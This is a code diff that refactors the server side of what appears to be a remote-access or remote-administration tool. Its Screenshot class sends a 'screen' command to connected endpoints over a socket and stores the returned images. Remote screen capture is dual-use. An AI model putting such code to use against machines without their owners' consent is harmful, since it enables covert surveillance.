@@ -4,6 +4,7 @@ import glob
 import os
 
 from Modules.logger import init_logger
+from Modules.utils import Handlers
 
 
 class Screenshot:
@@ -17,19 +18,8 @@ class Screenshot:
         self.shell_target = shell_target
         self.screenshot_path = os.path.join(self.path, self.endpoint.ident)
         self.logger = init_logger(self.log_path, __name__)
-
-        self.server = server
-
-    def create_local_dir(self):
-        local_dir = os.path.join('static', 'images', self.endpoint.ident)
-        try:
-            os.makedirs(local_dir, exist_ok=True)
-
-        except Exception as e:
-            print(f"Failed to create directory '{local_dir}': {e}")
-            sys.exit(1)
-
-        return local_dir
+        self.handlers = Handlers(self.log_path, self.screenshot_path, self.endpoint)
+        self.local_dir = self.handlers.handle_local_dir()
 
     def bytes_to_number(self, b: int) -> int:
         res = 0
@@ -48,6 +38,7 @@ class Screenshot:
             self.filename = str(self.filename).strip("b'")
             self.endpoint.conn.send("Filename OK".encode())
             self.screenshot_file_path = os.path.join(self.screenshot_path, self.filename)
+            print(self.screenshot_file_path)
 
         except (ConnectionError, socket.error) as e:
             self.handle_errors(e)
@@ -113,10 +104,8 @@ class Screenshot:
             self.last_screenshot = os.path.basename(latest_file)
 
             if self.endpoint.conn == self.shell_target:
-                endpoint_ident = self.endpoint.ident
-                local_dir = self.create_local_dir()
                 src = os.path.join(self.screenshot_path, self.last_screenshot)
-                shutil.copy(src, local_dir)
+                shutil.copy(src, self.local_dir)
 
             # os.startfile(self.last_sc_path)
             self.logger.info(f"Screenshot completed.")
@@ -126,7 +115,7 @@ class Screenshot:
 
     def run(self):
         self.logger.info(f"Running screenshot...")
-        self.logger.debug(f"Calling make_dir...")
+
         try:
             self.logger.debug(f"Sending screen command to client...")
             self.endpoint.conn.send('screen'.encode())
